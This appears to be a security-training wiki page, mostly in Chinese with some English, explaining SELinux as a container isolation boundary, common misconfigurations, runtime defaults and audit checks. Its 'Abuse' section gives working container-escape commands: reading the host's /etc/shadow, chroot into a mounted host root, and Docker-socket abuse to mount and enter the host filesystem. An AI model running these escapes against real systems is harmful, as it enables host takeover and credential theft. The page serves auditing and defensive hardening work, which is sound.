# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

SELinux 是一种 **基于标签的强制访问控制** 系统。每个相关的进程和对象可能携带一个安全上下文，策略决定哪些域可以以何种方式与哪些类型交互。在容器化环境中，这通常意味着运行时会在受限的容器域下启动容器进程，并用相应的类型标记容器内容。如果策略工作正常，进程可以读取和写入其标签被期望接触的内容，同时被拒绝访问其他主机内容，即使这些内容通过挂载变得可见。

这是主流 Linux 容器部署中可用的最强大的主机端防护之一。在 Fedora、RHEL、CentOS Stream、OpenShift 以及其他以 SELinux 为中心的生态系统中尤其重要。在这些环境中，忽视 SELinux 的审查者经常会误解为什么看似明显的主机妥协路径实际上被阻止了。

## AppArmor 与 SELinux

最简单的高层区别是 AppArmor 是基于路径的，而 SELinux 是 **基于标签的**。这对容器安全有重大影响。基于路径的策略在相同的主机内容通过意外的挂载路径出现时可能表现不同。基于标签的策略则会询问对象的标签是什么以及进程域可以对其做什么。这并不意味着 SELinux 简单，但它确实使其对防御者有时在基于 AppArmor 的系统中无意做出的那类依赖路径的假设具有更强的鲁棒性。

由于模型是面向标签的，容器卷处理和重新标记的决策具有安全关键性。如果运行时或运营者为“让挂载工作”而过于广泛地更改标签，本应约束工作负载的策略边界可能会比预期变得脆弱得多。

## 实验

要检查主机上是否启用了 SELinux：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
要检查主机上的现有标签：
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
要比较一次正常运行与一次禁用标记的运行：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a 工作负载 running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **已安装的** SELinux with **实际生效的** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the 工作负载 under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the 工作负载, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with 可写的 volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
如果存在 host bind mount，且 SELinux labeling 已被禁用或削弱，通常会首先出现信息泄露：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
如果 mount 可写，并且从 kernel 的角度看 container 实际上是 host-root，下一步应当测试对 host 的可控修改，而不是猜测：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
在支持 SELinux 的主机上，运行时状态目录周围的标签丢失也可能暴露直接的 privilege-escalation 路径：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
这些命令不能替代完整的 escape chain，但它们可以非常快速地表明是否是 SELinux 阻止了对 host 数据访问或对 host 端文件的修改。

### 完整示例：SELinux 禁用 + 可写的 host 挂载

如果 SELinux labeling 被禁用且 host 文件系统在 `/host` 挂载为可写，那么完整的 host escape 就会变成普通的 bind-mount 滥用案例：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果 `chroot` 成功，容器进程现在正从宿主文件系统运行：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完整示例：SELinux 已禁用 + 运行时目录

如果工作负载在标签被禁用后能够访问运行时套接字，则可以将逃逸委托给运行时：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
相关的观察是 SELinux 通常是阻止这类 host-path 或 runtime-state 访问的控制机制。

## Checks

进行 SELinux 检查的目标是确认 SELinux 已启用、识别当前的 security context，并查看你关心的文件或路径是否实际被 label 限制。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
这里值得注意的点：

- `getenforce` 理想情况下应返回 `Enforcing`；`Permissive` 或 `Disabled` 会改变整个 SELinux 部分的含义。
- 如果当前进程上下文看起来异常或过于宽泛，工作负载可能没有在预期的容器策略下运行。
- 如果宿主挂载的文件或运行时目录的标签被进程过于自由地访问，bind mounts 会变得更加危险。

在对支持 SELinux 的平台上的容器进行审查时，不要把标签视为次要细节。在许多情况下，它是主机尚未被攻破的主要原因之一。

## 运行时默认值

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 视主机而定 | 在启用 SELinux 的主机上可用 SELinux 隔离，但具体行为取决于主机/daemon 的配置 | `--security-opt label=disable`、对绑定挂载的广泛重新标记、`--privileged` |
| Podman | 通常在 SELinux 主机上启用 | 在 SELinux 系统上，SELinux 隔离是 Podman 的常规部分，除非被禁用 | `--security-opt label=disable`、在 `containers.conf` 中的 `label=false`、`--privileged` |
| Kubernetes | 通常不会在 Pod 级别自动分配 | 存在 SELinux 支持，但 Pod 通常需要 `securityContext.seLinuxOptions` 或平台特定的默认设置；还需要运行时和节点的支持 | 薄弱或过于宽泛的 `seLinuxOptions`、在 permissive/disabled 节点上运行、禁用标签的平台策略 |
| CRI-O / OpenShift style deployments | 通常被广泛依赖 | 在这些环境中，SELinux 通常是节点隔离模型的核心部分 | 过度放宽访问权限的自定义策略、为兼容性而禁用标签 |

SELinux 的默认设置比 seccomp 更依赖于发行版。在 Fedora/RHEL/OpenShift 类系统中，SELinux 常常是隔离模型的核心。在不支持 SELinux 的系统中，它则根本不存在。
{{#include ../../../../banners/hacktricks-training.md}}
